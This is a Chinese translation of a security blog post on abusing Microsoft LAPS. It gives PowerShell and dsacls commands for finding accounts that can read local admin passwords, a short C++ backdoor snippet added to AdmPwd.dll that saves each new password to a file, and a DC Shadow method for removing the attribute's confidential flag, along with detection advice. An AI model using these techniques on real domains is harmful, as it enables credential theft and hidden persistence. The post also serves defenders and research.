> 原文链接: https://www.anquanke.com//post/id/169178 


# 如何滥用LAPS窃取用户凭据


                                阅读量   
                                **166034**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者akijosberryblog，文章来源：akijosberryblog.wordpress.com
                                <br>原文地址：[https://akijosberryblog.wordpress.com/2019/01/01/malicious-use-of-microsoft-laps/](https://akijosberryblog.wordpress.com/2019/01/01/malicious-use-of-microsoft-laps/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t017072c87262be0699.jpg)](https://p1.ssl.qhimg.com/t017072c87262be0699.jpg)



## 一、LAPS简介

[LAPS](https://technet.microsoft.com/en-us/mt227395.aspx)（Local Administrator Password Solution，本地管理员密码解决方案）是用来管理域内主机本地管理员密码的一款工具。LAPS会将密码/凭据存放在活动目录中与计算机对应的对象的一个机密属性（confidential attribute）中。通过随机生成本地管理员的密码，LAPS可以有效消除横向渗透所带来的安全风险。LAPS是一种组策略客户端扩展（Group Policy Client Side Extension ，CSE），安装在所有受管主机上，可以执行所有管理任务。

如果目标账户具备AD中计算机对象的完全控制权限（如域管理员），就可以读取及写入相关信息（比如密码及过期时间戳）。存放在AD中的密码受ACL保护，系统管理员负责定义可以（以及无法）读取这些属性的账户。当密码及时间戳在网络中传输时，会使用kerberos进行加密，当存放在AD中时，密码和时间戳都以明文形式存储。



## 二、LAPS组件

LAPS包含如下组件：
<li>Agent：组策略客户端扩展（CSE）
<ul>
- 用于事件记录及随机密码生成- 用于具体配置- 计算机对象（Computer Object）、机密属性、审计域控安全日志


## 三、侦察踩点

如果我们已突破某台主机，首先我们需要判断当前节点是否安装了LAPS解决方案。我们可以使用powershell cmdlet来判断系统中是否存在`admpwd.dll`，命令如下：

```
Get-ChildItem ‘c:\program files\LAPS\CSE\Admpwd.dll’
```

接下来判断哪些账户具备`ms-Mcs-AdmPwd`的读取权限。我们可以使用[Powerview](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView)来识别具备`ms-Mcs-AdmPwd`读取权限的用户。

```
Get-NetOU -FullData | Get-ObjectAcl -ResolveGUIDs |
Where-Object `{`
($_.ObjectType -like 'ms-Mcs-AdmPwd') -and
($_.ActiveDirectoryRights -match 'ReadProperty')
`}`
```

[![](https://p2.ssl.qhimg.com/t0178a185caaef8eb61.png)](https://p2.ssl.qhimg.com/t0178a185caaef8eb61.png)

如果目标主机上启用了RSAT（Remote Server Administration Tools，远程服务器管理工具），那么我们就可以使用一种有趣的方法来判断具备`ms-Mcs-AdmPwd`读取权限的用户，命令非常简单，如下所示：

```
dsacls.exe 'Path to the AD DS Object'
```

具体过程可参考该[视频](https://youtu.be/yhB7JKr12nw)。



## 四、导出LAPS密码

一旦找到具备`ms-Mcs-AdmPwd`读取权限的用户，下一步我们需要搞定这些用户账户，然后导出明文形式的LAPS密码。

前面我写过如何导出LAPS明文密码的一篇[文章](https://akijosberryblog.wordpress.com/2017/11/09/dump-laps-password-in-clear-text/)，建议大家可以先参考一下这篇文章。

> 小贴士：强烈建议管理员只将`ms-Mcs-AdmPwd`开放给真正需要管理计算机对象的那些用户，移除不需要访问权限的其他用户。



## 五、污染AdmPwd.dll

之前大多数研究内容/攻击技术主要关注的是服务端（比如寻找能够读取密码的账户），较少关注客户端。然而微软的LAPS是一个客户端扩展，会运行用来管理密码的一个dll文件（`admpwd.dll`）。

LAPS基于Jiri Formacek开发的名为“AdmPwd”的一个开源解决方案，从2015年5月份起LAPS已经成为微软产品中的一员。LAPS方案并不具备完整性检查机制或者dll文件的签名验证机制。AdmPwd方案与微软的LAPS兼容，因此我们可以考虑从源代码编译整个工程，将编译结果替换原始的dll，通过这种方式污染`AdmPwd.dll`。为了替换原始的dll，我们需要获取管理员权限。在本文中，我们假设攻击者已经通过LPE（本地提权）或者其他方式获得管理员权限。

接下来我们可以在[AdmPwd](https://github.com/GreyCorbel/admpwd)源码中添加3~4行代码，然后编译生成恶意dll文件。我们需要找到源工程中将新密码以及时间戳发送给AD的代码位置，将新的代码添加到该位置。

```
wofstream backdoor;
backdoor.open("c:\backdoor.txt");
backdoor &lt;&lt; newPwd;
backdoor.close();
```

利用这种方法，攻击者可以保持隐蔽性，在同步密码的同时还能遵循LAPS策略。

具体过程可参考该[视频](https://youtu.be/33ZqY7cFt0A)，如果我们修改的dll没有被发现，就能一直保持隐蔽驻留。



## 六、检测及防护

可以考虑如下几种防护措施：
- 检查`admpwd.dll`的完整性/签名
- 可以创建文件完整性监控（File Integrity Monitoring，FIM）策略，监控对dll的修改操作
- 采用应用白名单机制，检测/避免dll投毒攻击
<li>将相关注册表键值设置为`2`（Verbose模式，记录一切信息）来提升LAPS日志等级，具体路径为`HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\GPExtensions\`{`D76B9641-3288-4f75-942D-087DE603E3EA`}`\ExtensionDebugLevel`
</li>
注意：以上方法只是我个人的建议，不能保证是否切实有效。



## 七、修改searchFlags属性

我们感兴趣的属性为`ms-Mcs-AdmPwd`，这是一个机密属性。首先我们需要获取`ms-Mcs-AdmPwd`的`searchFlags`属性，可以使用活动目录PS模块来完成这个任务：

[![](https://p0.ssl.qhimg.com/t01b5e5ba6c80b67198.png)](https://p0.ssl.qhimg.com/t01b5e5ba6c80b67198.png)

[searchFlags](https://msdn.microsoft.com/en-us/library/cc223153.aspx)属性的值为`904`（即`0x388`），在这个值中，我们需要删除第7个bit值，这个bit代表的正是机密属性。假如第7个bit值为`0x00000080`，删除这个机密值后，新的值为`0x308`（等于`0x388-0x80`，即`776`）。我们可以使用DC Shadow攻击来修改`searchFlags`属性。

攻击过程可参考该[视频](https://youtu.be/NPBEziTLSE8)。



## 八、检测及防护

可以考虑如下几种防护措施：
- 部署能够检测DC Shadow攻击的各种措施（如ALSID Team的powershell脚本，该脚本使用`LDAP_SERVER_NOTIFICATION_OID`进行检测，能够跟踪AD基础架构的改动细节）
- 微软ATA（高级威胁分析）也可以检测恶意域复制攻击
- 我们也能比较`searchFlags`属性的元数据（metadata）来检测攻击行为，或者查看`LocalChangeUSN`是否与`searchFlags`属性不一致
注意：在我的实验环境中，当我从一台DC中删除这个机密属性时，这种改动也会同步到另一个DC（比如新的`searchFlags`属性值（`776`）也会复制到其他DC上）。此外我还注意到另一点，每次改动后，`SerachFlags`版本值就会增加，但在实验环境中，当该值超过10后就不再变化。如果大家在测试过程有新的发现，请及时通知我。



## 九、参考资料

[https://technet.microsoft.com/en-us/mt227395.aspx](https://technet.microsoft.com/en-us/mt227395.aspx)

[https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView)

[https://akijosberryblog.wordpress.com/2017/11/09/dump-laps-password-in-clear-text/](https://akijosberryblog.wordpress.com/2017/11/09/dump-laps-password-in-clear-text/)

[https://2017.hack.lu/archive/2017/HackLU_2017_Malicious_use_LAPS_Clementz_Goichot.pdf](https://2017.hack.lu/archive/2017/HackLU_2017_Malicious_use_LAPS_Clementz_Goichot.pdf)

[https://github.com/GreyCorbel/admpwd](https://github.com/GreyCorbel/admpwd)

[https://rastamouse.me/2018/03/laps—part-2/](https://rastamouse.me/2018/03/laps%E2%80%94part-2/)

[http://adds-security.blogspot.com/2018/08/mise-en-place-dune-backdoor-laps-via.html](http://adds-security.blogspot.com/2018/08/mise-en-place-dune-backdoor-laps-via.html)

[https://msdn.microsoft.com/en-us/library/cc223153.aspx](https://msdn.microsoft.com/en-us/library/cc223153.aspx)

[https://github.com/AlsidOfficial/UncoverDCShadow](https://github.com/AlsidOfficial/UncoverDCShadow)
